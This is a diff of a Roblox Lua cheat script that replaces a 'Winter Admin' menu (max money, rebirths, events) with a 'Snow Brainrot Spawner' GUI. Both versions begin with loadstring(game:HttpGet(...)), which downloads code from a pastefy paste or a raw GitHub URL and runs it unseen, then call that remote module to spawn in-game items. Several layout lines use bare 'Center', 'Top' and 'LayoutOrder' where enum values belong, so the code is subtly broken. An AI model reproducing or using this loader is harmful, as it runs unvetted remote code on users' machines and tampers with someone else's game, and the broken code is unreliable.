@@ -1,127 +1,104 @@
---// Load Admin
-local Admin = loadstring(game:HttpGet("https://pastefy.app/Kg4Dqg8H/raw"))()
+--// Snow Compact Spawner GUI
+local Spawner = loadstring(game:HttpGet(
+    "https://raw.githubusercontent.com/lilbrolilbrohaha/dark/refs/heads/main/sab.lua"
+))()
 
---// Services
 local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local LocalPlayer = Players.LocalPlayer
+local UIS = game:GetService("UserInputService")
+local LP = Players.LocalPlayer
 
---// GUI
-local gui = Instance.new("ScreenGui")
-gui.Name = "WinterAdminGUI"
+-- GUI
+local gui = Instance.new("ScreenGui", LP.PlayerGui)
+gui.Name = "SnowSpawner"
 gui.ResetOnSpawn = false
-gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
---// Main Frame
 local main = Instance.new("Frame", gui)
-main.Size = UDim2.fromScale(0.32, 0.42)
-main.Position = UDim2.fromScale(0.34, 0.29)
-main.BackgroundColor3 = Color3.fromRGB(200, 230, 255)
+main.Size = UDim2.fromScale(0.28, 0.38)
+main.Position = UDim2.fromScale(0.36, 0.3)
+main.BackgroundColor3 = Color3.fromRGB(235, 245, 255)
 main.BorderSizePixel = 0
 main.Active = true
 main.Draggable = true
-
--- Rounded corners
-local corner = Instance.new("UICorner", main)
-corner.CornerRadius = UDim.new(0, 18)
-
--- Winter Gradient
-local gradient = Instance.new("UIGradient", main)
-gradient.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 245, 255)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 210, 255))
-}
-gradient.Rotation = 90
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)
 
 -- Title
 local title = Instance.new("TextLabel", main)
-title.Size = UDim2.new(1, 0, 0, 45)
+title.Size = UDim2.fromScale(1, 0.18)
 title.BackgroundTransparency = 1
-title.Text = "❄️ Winter Admin ❄️"
+title.Text = "❄️ Snow Brainrot Spawner"
 title.Font = Enum.Font.GothamBold
-title.TextSize = 22
-title.TextColor3 = Color3.fromRGB(40, 80, 120)
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(80, 120, 160)
 
--- Buttons Container
-local container = Instance.new("Frame", main)
-container.Position = UDim2.new(0, 0, 0, 55)
-container.Size = UDim2.new(1, 0, 1, -65)
-container.BackgroundTransparency = 1
+-- Container
+local list = Instance.new("UIListLayout", main)
+list.Padding = UDim.new(0, 6)
+list.HorizontalAlignment = Center
+list.VerticalAlignment = Top
+list.SortOrder = LayoutOrder
 
-local layout = Instance.new("UIListLayout", container)
-layout.Padding = UDim.new(0, 8)
-layout.HorizontalAlignment = Center
+-- Spacing
+title.LayoutOrder = 1
 
--- Button function
-local function createButton(text, callback)
-	local btn = Instance.new("TextButton", container)
-	btn.Size = UDim2.new(0.9, 0, 0, 40)
-	btn.BackgroundColor3 = Color3.fromRGB(235, 248, 255)
-	btn.Text = text
-	btn.Font = Enum.Font.Gotham
-	btn.TextSize = 16
-	btn.TextColor3 = Color3.fromRGB(30, 70, 110)
-	btn.AutoButtonColor = false
-
-	local c = Instance.new("UICorner", btn)
-	c.CornerRadius = UDim.new(0, 14)
-
-	btn.MouseEnter:Connect(function()
-		TweenService:Create(
-			btn,
-			TweenInfo.new(0.15),
-			{BackgroundColor3 = Color3.fromRGB(210, 235, 255)}
-		):Play()
-	end)
-
-	btn.MouseLeave:Connect(function()
-		TweenService:Create(
-			btn,
-			TweenInfo.new(0.15),
-			{BackgroundColor3 = Color3.fromRGB(235, 248, 255)}
-		):Play()
-	end)
-
-	btn.MouseButton1Click:Connect(callback)
+local function box(ph)
+    local t = Instance.new("TextBox", main)
+    t.Size = UDim2.fromScale(0.9, 0.12)
+    t.PlaceholderText = ph
+    t.Text = ""
+    t.ClearTextOnFocus = false
+    t.Font = Enum.Font.Gotham
+    t.TextSize = 14
+    t.TextColor3 = Color3.fromRGB(40, 40, 40)
+    t.BackgroundColor3 = Color3.fromRGB(250, 250, 255)
+    t.BorderSizePixel = 0
+    Instance.new("UICorner", t).CornerRadius = UDim.new(0, 8)
+    return t
 end
 
---// Buttons
-createButton("Spawn Strawberry Elephant", function()
-	Admin.SpawnBrainrot("Strawberry Elephant")
+local brainrotBox = box("Brainrot Name")
+brainrotBox.LayoutOrder = 2
+
+local mutationBox = box("Mutation (optional)")
+mutationBox.LayoutOrder = 3
+
+local traitsBox = box("Traits (comma separated)")
+traitsBox.LayoutOrder = 4
+
+-- Spawn Button
+local spawn = Instance.new("TextButton", main)
+spawn.Size = UDim2.fromScale(0.9, 0.14)
+spawn.Text = "❄️ SPAWN"
+spawn.Font = Enum.Font.GothamBold
+spawn.TextSize = 15
+spawn.TextColor3 = Color3.new(1,1,1)
+spawn.BackgroundColor3 = Color3.fromRGB(100, 170, 220)
+spawn.BorderSizePixel = 0
+spawn.LayoutOrder = 5
+Instance.new("UICorner", spawn).CornerRadius = UDim.new(0, 10)
+
+spawn.MouseButton1Click:Connect(function()
+    local name = brainrotBox.Text
+    if name == "" then return end
+
+    local mut = mutationBox.Text
+    if mut == "" then mut = nil end
+
+    local traits = {}
+    for t in string.gmatch(traitsBox.Text, "[^,%s]+") do
+        table.insert(traits, t)
+    end
+    if #traits == 0 then traits = nil end
+
+    Spawner.Spawn(name, mut, traits)
 end)
 
-createButton("Spawn Shiny Elephant", function()
-	Admin.SpawnBrainrot("Strawberry Elephant", "Shiny")
-end)
+-- Snow Particles
+local snow = Instance.new("ParticleEmitter")
+snow.Texture = "rbxassetid://241837157"
+snow.Rate = 10
+snow.Lifetime = NumberRange.new(6)
+snow.Speed = NumberRange.new(1, 2)
+snow.Rotation = NumberRange.new(0, 360)
+snow.Parent = Instance.new("Attachment", main)
 
-createButton("Spawn Meowl (In Base)", function()
-	Admin.SpawnBrainrotInBase("Meowl")
-end)
-
-createButton("Spawn Rainbow Lucky Block", function()
-	Admin.SpawnLuckyBlock("Rainbow Block")
-end)
-
-createButton("Set Money to Max", function()
-	Admin.SetMoney(999999999)
-end)
-
-createButton("Set Rebirth to 15", function()
-	Admin.SetRebirth(15)
-end)
-
-createButton("Start Strawberry Event", function()
-	Admin.StartEvent("Strawberry")
-end)
-
-createButton("Run All Events", function()
-	Admin.ExecuteAllEvents(true)
-end)
-
-createButton("Morph: Strawberry Elephant", function()
-	Admin.Morph("Strawberry Elephant")
-end)
-
-createButton("❌ Close GUI", function()
-	gui:Destroy()
-end)
+print("❄️ Snow Spawner Loaded")
